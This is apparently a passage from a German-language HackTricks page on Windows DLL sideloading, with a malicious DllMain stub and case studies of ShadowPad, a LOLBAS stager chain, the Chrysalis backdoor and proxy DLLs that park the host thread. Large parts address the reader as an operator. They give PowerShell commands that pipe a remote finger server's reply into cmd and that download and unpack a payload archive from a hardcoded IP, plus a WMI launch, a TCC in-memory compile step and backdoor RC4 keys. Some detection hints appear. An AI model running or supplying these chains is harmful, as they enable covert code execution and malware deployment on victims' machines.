BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Für Export-Anforderungen verwende ein proxying framework (z. B. DLLirant/Spartacus), um eine forwarding DLL zu erzeugen, die auch deinen payload ausführt.

- Diese Technik beruht auf DLL name resolution durch die host binary. Wenn der Host absolute Pfade oder sichere Loading-Flags verwendet (z. B. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), kann der hijack fehlschlagen.
- KnownDLLs, SxS und forwarded exports können die precedence beeinflussen und müssen bei der Auswahl der host binary und des export set berücksichtigt werden.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point beschrieb, wie Ink Dragon ShadowPad mithilfe eines **three-file triad** einsetzt, um sich mit legitimer Software zu vermischen, während der core payload auf disk verschlüsselt bleibt:

1. **Signed host EXE** – Vendoren wie AMD, Realtek oder NVIDIA werden missbraucht (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Die Angreifer benennen die Executable um, damit sie wie eine Windows binary aussieht (zum Beispiel `conhost.exe`), aber die Authenticode signature bleibt gültig.
2. **Malicious loader DLL** – neben der EXE mit einem erwarteten Namen abgelegt (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Die DLL ist normalerweise eine MFC binary, die mit dem ScatterBrain framework obfuskiert wurde; ihre einzige Aufgabe ist es, den verschlüsselten blob zu finden, ihn zu entschlüsseln und ShadowPad reflectively zu laden.
3. **Encrypted payload blob** – oft als `<name>.tmp` im selben Verzeichnis gespeichert. Nachdem der entschlüsselte payload in memory gemappt wurde, löscht der loader die TMP-Datei, um forensische Beweise zu vernichten.

Tradecraft notes:

* Das Umbenennen der signierten EXE (während das ursprüngliche `OriginalFileName` im PE header erhalten bleibt) lässt sie wie eine Windows binary auftreten und gleichzeitig die vendor signature behalten; repliziere also Ink Dragons Gewohnheit, `conhost.exe`-ähnliche binaries abzulegen, die in Wirklichkeit AMD/NVIDIA utilities sind.
* Da die Executable vertrauenswürdig bleibt, müssen die meisten allowlisting controls nur deine malicious DLL neben ihr haben. Konzentriere dich darauf, die loader DLL anzupassen; der signierte Parent kann normalerweise unverändert laufen.
* Der decryptor von ShadowPad erwartet, dass der TMP blob neben dem loader liegt und schreibbar ist, damit er die Datei nach dem mapping auf null setzen kann. Halte das Verzeichnis schreibbar, bis der payload geladen ist; sobald er im memory ist, kann die TMP-Datei sicher für OPSEC gelöscht werden.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators kombinieren DLL sideloading mit LOLBAS, sodass das einzige benutzerdefinierte Artefakt auf disk die malicious DLL neben der vertrauenswürdigen EXE ist:

- **Remote command loader (Finger):** Hidden PowerShell startet `cmd.exe /c`, zieht Befehle von einem Finger-Server und leitet sie an `cmd` weiter:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` zieht TCP/79-Text; `| cmd` führt die Server-Antwort aus, sodass Operators die second stage serverseitig rotieren können.

- **Built-in download/extract:** Lade ein Archiv mit einer harmlosen Endung herunter, entpacke es und stage das sideload-Ziel plus DLL in einem zufälligen `%LocalAppData%`-Ordner:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` versteckt den Fortschritt und folgt Redirects; `tar -xf` nutzt Windows' eingebautes tar.

- **WMI/CIM launch:** Starte die EXE per WMI, sodass Telemetrie einen durch CIM erstellten Prozess zeigt, während er die lokal abgelegte DLL lädt:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Funktioniert mit binaries, die lokale DLLs bevorzugen (z. B. `intelbq.exe`, `nearby_share.exe`); payload (z. B. Remcos) läuft unter dem vertrauenswürdigen Namen.

- **Hunting:** Alarmiere bei `forfiles`, wenn `/p`, `/m` und `/c` zusammen auftauchen; außerhalb von Admin-Skripten ungewöhnlich.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Eine aktuelle Lotus-Blossom-Intrusion missbrauchte eine vertrauenswürdige Update-Kette, um einen NSIS-gepackten dropper zu liefern, der ein DLL sideload plus vollständig im Speicher ausgeführte payloads bereitstellte.

Tradecraft flow
- `update.exe` (NSIS) erstellt `%AppData%\Bluetooth`, markiert es als **HIDDEN**, legt eine umbenannte Bitdefender Submission Wizard `BluetoothService.exe`, eine malicious `log.dll` und einen verschlüsselten blob `BluetoothService` ab und startet dann die EXE.
- Die Host EXE importiert `log.dll` und ruft `LogInit`/`LogWrite` auf. `LogInit` lädt den blob per mmap; `LogWrite` entschlüsselt ihn mit einem custom LCG-based stream (**0x19660D** / **0x3C6EF35F**, key material aus einem früheren Hash abgeleitet), überschreibt den Buffer mit Plaintext shellcode, gibt temporäre Daten frei und springt hinein.
- Um eine IAT zu vermeiden, löst der loader APIs durch das Hashen von Exportnamen mit **FNV-1a basis 0x811C9DC5 + prime 0x1000193** auf und wendet dann einen Murmur-ähnlichen avalanche (**0x85EBCA6B**) an, wobei gegen gesalzene target hashes verglichen wird.

Main shellcode (Chrysalis)
- Entschlüsselt ein PE-ähnliches main module, indem add/XOR/sub mit dem key `gQ2JR&9;` über fünf Durchgänge wiederholt wird, und lädt dann dynamisch `Kernel32.dll` → `GetProcAddress`, um die Importauflösung abzuschließen.
- Rekonstruiert DLL-Namensstrings zur Laufzeit per Bit-rotate/XOR-Transformationen pro Zeichen und lädt dann `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Verwendet einen zweiten Resolver, der die **PEB → InMemoryOrderModuleList** durchläuft, jede export table in 4-Byte-Blöcken mit Murmur-ähnlichem mixing analysiert und nur dann auf `GetProcAddress` zurückfällt, wenn der Hash nicht gefunden wird.

Embedded configuration & C2
- Die Konfiguration liegt innerhalb der abgelegten Datei `BluetoothService` bei **offset 0x30808** (Größe **0x980**) und wird mit RC4 unter dem key `qwhvb^435h&*7` entschlüsselt, wodurch die C2-URL und der User-Agent offengelegt werden.
- Beacons bauen ein punktgetrenntes host profile auf, stellen das Tag `4Q` voran und verschlüsseln dann mit RC4 unter dem key `vAuig34%^325hGV`, bevor sie `HttpSendRequestA` über HTTPS aufrufen. Responses werden per RC4 entschlüsselt und über einen tag switch verteilt (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Der execution mode wird über CLI args gesteuert: keine args = persistence installieren (service/Run key) mit Verweis auf `-i`; `-i` startet sich selbst erneut mit `-k`; `-k` überspringt die Installation und führt den payload aus.

Alternate loader observed
- Dieselbe Intrusion legte Tiny C Compiler ab und führte `svchost.exe -nostdlib -run conf.c` aus `C:\ProgramData\USOShared\` aus, mit `libtcc.dll` daneben. Der vom Angreifer gelieferte C source enthielt shellcode, wurde kompiliert und lief im memory, ohne die disk mit einer PE zu berühren. Repliziere mit:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Diese TCC-basierte Compile-and-run-Phase importierte `Wininet.dll` zur Laufzeit und lud eine zweite Shellcode-Stage von einer hardcodierten URL, wodurch ein flexibler Loader entstand, der sich als Compiler-Run tarnte.

## Signed-host sideloading mit export proxying + host thread parking

Einige DLL sideloading chains fügen **stability engineering** hinzu, damit der legitime Host lange genug aktiv bleibt, um spätere Stages sauber zu laden, statt nach dem Laden der bösartigen DLL abzustürzen.

Beobachtetes Muster
- Lege eine vertrauenswürdige EXE neben eine bösartige DLL mit dem erwarteten Abhängigkeitsnamen wie `version.dll`.
- Die bösartige DLL **proxyt jedes erwartete export** zurück an die echte System-DLL (zum Beispiel `%SystemRoot%\\System32\\version.dll`), sodass die Importauflösung weiterhin funktioniert und der Host-Prozess weiterläuft.
- Nach dem Laden **patched** die bösartige DLL den Host entry point, sodass der Main Thread in einer endlosen `Sleep`-Schleife landet, statt zu beenden oder Codepfade auszuführen, die den Prozess terminieren würden.
- Ein neuer Thread führt die eigentliche bösartige Arbeit aus: Entschlüsseln des Namens oder Pfads der nächsten DLL-Stage (RC4/XOR sind üblich), dann Starten mit `LoadLibrary`.

Warum das wichtig ist
- Normales DLL proxying erhält die API-Kompatibilität, garantiert aber nicht, dass der Host lange genug aktiv bleibt, um spätere Stages auszuführen.
- Das Parken des Main Thread in `Sleep(INFINITE)` ist eine einfache Möglichkeit, den signierten Prozess resident zu halten, während der Loader Entschlüsselung, Staging oder Network-Bootstrap in einem Worker-Thread ausführt.
- Nur nach einem verdächtigen `DllMain` zu suchen, übersieht dieses Muster, wenn das interessante Verhalten erst nach dem Patchen des Host entry point und dem Start eines sekundären Threads auftritt.

Minimaler Ablauf
1. Kopiere die signierte Host-EXE und bestimme die DLL, die sie aus dem lokalen Verzeichnis auflöst.
2. Erstelle eine Proxy-DLL, die dieselben Funktionen exportiert und an die legitime DLL weiterleitet.
3. Erzeuge in `DllMain(DLL_PROCESS_ATTACH)` einen Worker-Thread.
4. Patche von diesem Thread aus den Host entry point oder die Main-Thread-Startroutine so, dass sie in `Sleep` schleift.
5. Entschlüssele den Namen oder die Konfiguration der nächsten DLL-Stage und rufe `LoadLibrary` auf oder mappe die Payload manuell.

Defensive Ansatzpunkte
- Signierte Prozesse laden `version.dll` oder ähnlich häufige Bibliotheken aus ihrem eigenen Anwendungsverzeichnis statt aus `System32`.
- Speicher-Patches am Process entry point kurz nach dem Image-Load, besonders Sprünge/Aufrufe, die auf `Sleep`/`SleepEx` umgeleitet werden.
- Threads, die von einer Proxy-DLL erstellt werden und sofort `LoadLibrary` auf eine zweite DLL mit entschlüsseltem Namen aufrufen.
- Full-export Proxy-DLLs, die neben Vendor-Executables in beschreibbaren Staging-Verzeichnissen wie `ProgramData`, `%TEMP%` oder entpackten Archivpfaden liegen.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)


{{#include ../../../banners/hacktricks-training.md}}
